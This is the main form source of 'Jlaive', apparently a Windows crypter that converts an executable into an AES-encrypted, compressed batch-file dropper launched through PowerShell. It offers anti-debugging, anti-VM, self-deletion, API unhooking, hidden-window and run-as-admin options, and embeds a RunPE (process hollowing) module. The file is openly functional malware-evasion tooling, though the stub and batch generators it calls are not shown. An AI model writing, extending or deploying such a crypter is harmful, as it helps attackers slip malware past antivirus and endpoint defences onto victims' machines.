using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

using static Jlaive.Utils;

namespace Jlaive
{
    public partial class Form1 : Form
    {
        public Form1() => InitializeComponent();

        private void Form1_Load(object sender, EventArgs e)
        {
            SettingsObject obj = Settings.Load();
            if (obj != null) UnpackSettings(obj);
            UpdateKeys();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.Save(PackSettings());
            Environment.Exit(0);
        }

        private void openButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            input.Text = ofd.FileName;
        }

        private void buildButton_Click(object sender, EventArgs e)
        {
            if (!File.Exists(input.Text))
            {
                MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (Path.GetExtension(input.Text) != ".exe")
            {
                MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            Crypt(input.Text, Convert.FromBase64String(key.Text), Convert.FromBase64String(iv.Text));
        }

        private void refreshKeys_Click(object sender, EventArgs e) => UpdateKeys();

        private void addFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            bindedFiles.Items.Add(ofd.FileName);
        }

        private void removeFile_Click(object sender, EventArgs e)
        {
            bindedFiles.Items.Remove(bindedFiles.SelectedItem);
        }

        private void Crypt(string _input, byte[] _key, byte[] _iv)
        {
            buildButton.Enabled = false;
            tabControl1.SelectedTab = tabControl1.TabPages["outputPage"];
            log.Items.Clear();

            StubGen stubgen = new StubGen(_key, _iv);
            byte[] payload = File.ReadAllBytes(_input);
            bool isnetasm = IsAssembly(_input);

            if (isnetasm)
            {
                log.Items.Add("Patching assembly...");
                Patcher.Fix(ref payload);
            }

            log.Items.Add("Compressing payload...");
            payload = Compress(payload);

            log.Items.Add("Creating stubs...");
            string stub = stubgen.CreateCS(antiDebug.Checked, antiVM.Checked, meltFile.Checked, unhookAPI.Checked, !isnetasm);
            string stub2 = stubgen.CreateBCS();

            log.Items.Add("Building stubs...");
            Compiler compiler = new Compiler
            {
                References = new string[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" },
                Resources = bindedFiles.Items.Cast<string>().ToArray()
            };
            JCompilerResult result = compiler.Build(stub);
            if (result.CompilerResults.Errors.Count > 0)
            {
                string errors = string.Join(Environment.NewLine, result.CompilerResults.Errors.Cast<CompilerError>().Select(error => error.ErrorText));
                MessageBox.Show($"Stub build errors:{Environment.NewLine}{errors}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            byte[] stubbytes = result.AssemblyBytes;
            compiler = new Compiler
            {
                References = new string[] { "mscorlib.dll", "System.Core.dll", "System.dll" }
            };
            result = compiler.Build(stub2);
            if (result.CompilerResults.Errors.Count > 0)
            {
                string errors = string.Join(Environment.NewLine, result.CompilerResults.Errors.Cast<CompilerError>().Select(error => error.ErrorText));
                MessageBox.Show($"Stub build errors:{Environment.NewLine}{errors}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            byte[] stubbytes2 = result.AssemblyBytes;

            log.Items.Add("Embedding resources...");
            List<PatcherResource> embeddedresources = new List<PatcherResource>() { new PatcherResource("JLAIVE_P", payload) };
            if (!isnetasm)
            {
                embeddedresources.Add(new PatcherResource("JLAIVE_RP", Compress(GetEmbeddedResource("Jlaive.Resources.runpe.dll"))));
            }
            if (unhookAPI.Checked)
            {
                embeddedresources.Add(new PatcherResource("JLAIVE_AU", Compress(GetEmbeddedResource("Jlaive.Resources.apiunhooker.exe"))));
            }
            Patcher.AddResources(ref stubbytes, embeddedresources.ToArray());

            log.Items.Add("Encrypting stubs...");
            byte[] stub_enc = Encrypt(Compress(stubbytes), _key, _iv);
            byte[] stub2_enc = Encrypt(Compress(stubbytes2), _key, _iv);

            log.Items.Add("Creating PowerShell command...");
            string pscommand = stubgen.CreatePS();

            log.Items.Add("Creating batch file...");
            string content = stubgen.CreateBat(pscommand, stub_enc, stub2_enc, hidden.Checked, runas.Checked);

            SaveFileDialog sfd = new SaveFileDialog()
            {
                AddExtension = true,
                DefaultExt = "bat",
                Title = "Save File",
                Filter = "Batch files (*.bat)|*.bat",
                RestoreDirectory = true,
                FileName = Path.ChangeExtension(_input, "bat")
            };
            sfd.ShowDialog();

            log.Items.Add("Writing output...");
            File.WriteAllText(sfd.FileName, content, Encoding.ASCII);

            MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            UpdateKeys();
            buildButton.Enabled = true;
        }

        private void UpdateKeys()
        {
            AesManaged aes = new AesManaged();
            key.Text = Convert.ToBase64String(aes.Key);
            iv.Text = Convert.ToBase64String(aes.IV);
            aes.Dispose();
        }

        private SettingsObject PackSettings()
        {
            SettingsObject obj = new SettingsObject()
            {
                inputFile = input.Text,
                antiDebug = antiDebug.Checked,
                antiVM = antiVM.Checked,
                selfDelete = meltFile.Checked,
                hidden = hidden.Checked,
                runas = runas.Checked,
                apiUnhook = unhookAPI.Checked,
                bindedFiles = bindedFiles.Items.Cast<string>().ToArray()
            };
            return obj;
        }

        private void UnpackSettings(SettingsObject obj)
        {
            input.Text = obj.inputFile;
            antiDebug.Checked = obj.antiDebug;
            antiVM.Checked = obj.antiVM;
            meltFile.Checked = obj.selfDelete;
            hidden.Checked = obj.hidden;
            runas.Checked = obj.runas;
            unhookAPI.Checked = obj.apiUnhook;
            bindedFiles.Items.AddRange(obj.bindedFiles);
        }
    }
}
